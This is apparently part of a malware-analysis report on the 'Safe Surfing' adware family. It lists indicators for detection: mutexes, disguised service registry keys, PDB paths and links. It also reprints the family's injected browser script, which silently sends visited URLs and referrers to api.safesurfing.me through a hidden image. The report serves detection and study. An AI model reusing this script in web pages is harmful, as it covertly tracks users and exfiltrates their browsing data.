+hxxps://bitly.com/2mfUhWn2
+hxxps://bitly.com/2lzYhUo
+----
+
+== Windows Artifacts
+
+=== Mutexes
+
+----
+Global\BitStreamSvc
+Global\D3DAdapter_ServiceEvent
+Global\Intel_hctrl32
+Global\KBDMAIServiceEvent
+Global\Kbdmai_ServiceEvent
+Global\OptimizeSataDevices
+Global\ServiceLibEvent
+Global\ThemeControl
+Global\WBiosrvp
+Global\Wlan_Manager_Initialize
+Global\Wsaudio_Initialize
+----
+
+=== Windows Registry keys
+
+----
+HKLM\SYSTEM\CurrentControlSet\Services\BitStreamSvc\
+HKLM\SYSTEM\CurrentControlSet\services\Bonjoiur Host Controller\
+HKLM\SYSTEM\CurrentControlSet\services\Coupons Browser Update Service\
+HKLM\SYSTEM\CurrentControlSet\services\d3dadapter\
+HKLM\SYSTEM\CurrentControlSet\Services\Ghostery Storage Server\
+HKLM\SYSTEM\CurrentControlSet\services\ihctrl32\
+HKLM\SYSTEM\CurrentControlSet\services\ir16_32\
+HKLM\SYSTEM\CurrentControlSet\services\KBDMAI\
+HKLM\SYSTEM\CurrentControlSet\Services\optsatadc\
+HKLM\SYSTEM\CurrentControlSet\services\themctrl\
+HKLM\SYSTEM\CurrentControlSet\Services\wbiosrvp\
+HKLM\SYSTEM\CurrentControlSet\Services\wlanmgr\
+HKLM\SYSTEM\CurrentControlSet\Services\wsaudio\
+HKLM\SOFTWARE\Classes\[0-9A-F]{4}.FieldListCtrl.1\
+HKLM\SOFTWARE\Classes\[0-9A-F]{4}.CoreClass.2\
+----
+
+=== PDB Paths
+
+----
+D:\work\brut\cms\facebook\facebookbot\Release\facebookbot.pdb
+D:\work\service\plugins\Release\get_hdd_serial_number.pdb
+D:\work\service\plugins\Release\remove_plugins_installer.pdb
+D:\work\service\plugins\Release\remove_zaxar.pdb
+D:\work\service\plugins\Release\reset_safesurfing_flag.pdb
+D:\work\service\service\Release\bstreamsvc.pdb
+D:\work\service\service\Release\bstreamsvc_setup.pdb
+D:\work\service\service\Release DRTIPROV\ir16_32.pdb
+D:\work\service\service\Release\first_service.pdb
+D:\work\service\service\Release\first_service_setup.pdb
+D:\work\service\service\Release\ihctrl32.pdb
+D:\work\service\service\Release\ihctrl32_setup.pdb
+D:\work\service\service\Release\ir16_32.pdb
+D:\work\service\service\Release\optsatadc.pdb
+D:\work\service\service\Release\optsatadc_setup.pdb
+D:\work\service\service\Release\themctrl.pdb
+D:\work\service\service\Release\themctrl_setup.pdb
+D:\work\service\service\Release\wbiosrvp_setup.pdb
+D:\work\service\service\Release\wsaudio_setup.pdb
+D:\work\ultdr\udsetup\Release\udsetup_winapi_morphed.pdb
+Z:\source\service\Release\ir16_32.pdb
+Z:\source\service\Release\setup_serv.pdb
+----
+
+== The Safe Surfing injected script
+
+[source, javascript]
+----
+var _________subscribe_checker = {
+    _detect_text: ["((\u0443\u0441\u043b\u043e\u0432|\u0443\u043f\u0440\u0430\u0432\u043b)(.*)\u043f\u043e\u0434\u043f\u0438\u0441\u043a)|(\u043f\u043e\u0434\u043f\u0438\u0441\u043a(.*)(\u0443\u0441\u043b\u043e\u0432|\u0443\u043f\u0440\u0430\u0432\u043b))", "\u043f\u0440\u0430\u0432\u0438\u043b(.*)\u043f\u043e\u0434\u043f\u0438\u0441\u043a", "\u0441\u0442\u043e\u0438\u043c\u043e\u0441(.*)\u0443\u0441\u043b\u0443\u0433"],
+    _detected_text_count: 0,
+    _hrefs: [],
+    _description_regex: /(\u0441\u043c\u0441|sms)[- ]\u0441\u043e\u043e\u0431\u0449\u0435\u043d(.*)\u0441(.*)(\u0441\u043b\u043e\u0432|\u0442\u0435\u043a\u0441\u0442|\u043a\u043e\u043c\u0430\u043d\u0434)(.*)(\u0441\u0442\u043e\u043f|stop)/,
+    check: function() {
+        if (this.isExcluded()) return !1;
+        this._hrefs = document.links;
+        return 1 == this.checkSiteBySubscribeTextInUrls() ? (this.send("by_text_in_urls"), !0) : 1 == this.checkSiteBySubscribeDescriptionText() ? (this.send("by_subscribe_text"), !0) : !1
+    },
+    isExcluded: function() {
+        return "http:" != document.location.protocol && "https:" != document.location.protocol || this.isExludedDomain(document.location.host) || this.isExludedDomain(document.referrer) ? !0 : this.isExcludedUrl()
+    },
+    checkSiteBySubscribeTextInUrls: function() {
+        for (var a in this._hrefs)
+            if (this._hrefs[a].href &&
+                this.isSubscribeText(this._hrefs[a].textContent) && 0 == this._detect_text.length) return !0;
+        return !1
+    },
+    checkSiteBySubscribeDescriptionText: function() {
+        if (0 == this._detected_text_count) return !1;
+        var a = document.body.textContent.split("."),
+            b;
+        for (b in a)
+            if (a[b].toLocaleLowerCase) {
+                var c = a[b].toLocaleLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");
+                if (this._description_regex.test(c)) return !0
+            }
+        return !1
+    },
+    isExludedDomain: function(a) {
+        var b = "mts rt megafonpro megafon mpoisk mail google yandex ya rambler youtube dfiles turbobit prom zakupka pravo letitbit ozon urokitio kismia webnice toy mdmbank tele2 roboforex share4web 7do dixy kiino 4allforum delo-press raskachaem satu spmag yugcontract narodnoe materinstvo dimonvideo kia-club deal icloud littlebyte maxpark 24video vdgb trud appsruel tiu blanker aucland office ontabfile microsoft shopotam shareflare autoportal stilagoby malina depositfiles hitfile crocs telecom effectfree forum.calorizator.ru traektoria cdek takko circ-a tinydeal otzyv mamba rusfolder irn labirint vip-file 10.150.0.104".split(" ");
+        a = a.split(".");
+        if (2 <= a.length)
+            for (var c in b)
+                if (a[a.length - 2] == b[c]) return !0;
+        return !1
+    },
+    isExcludedUrl: function() {
+        for (var a = ["a-elite/scrpop-promka/psr-"], b = 0; b < a.length; ++b)
+            if (-1 != document.location.pathname.indexOf(a[b])) return !0;
+        return !1
+    },
+    isSubscribeText: function(a) {
+        a = a.toLowerCase().replace(/(\n)/g, " ").replace(/(\r)/g, "");
+        for (var b in this._detect_text)
+            if ("string" === typeof this._detect_text[b] && 0 != this._detect_text[b].length && (new RegExp(this._detect_text[b].toLowerCase())).test(a)) return this._detect_text.splice(b,
+                1), ++this._detected_text_count, !0;
+        return !1
+    },
+    send: function(a) {
+        var b = document.createElement("img"),
+            c = new Date;
+        b.src = "http://api.safesurfing.me/detect/i.php?ss=" + encodeURIComponent(document.location.href) + "&rss=" + encodeURIComponent(document.referrer) + "&r=" + c.getTime() + "&v=2.07&by=" + a;
+        b.style.display = "none";
+        document.body.appendChild(b)
+    }
+};
+_________subscribe_checker.check();
+----
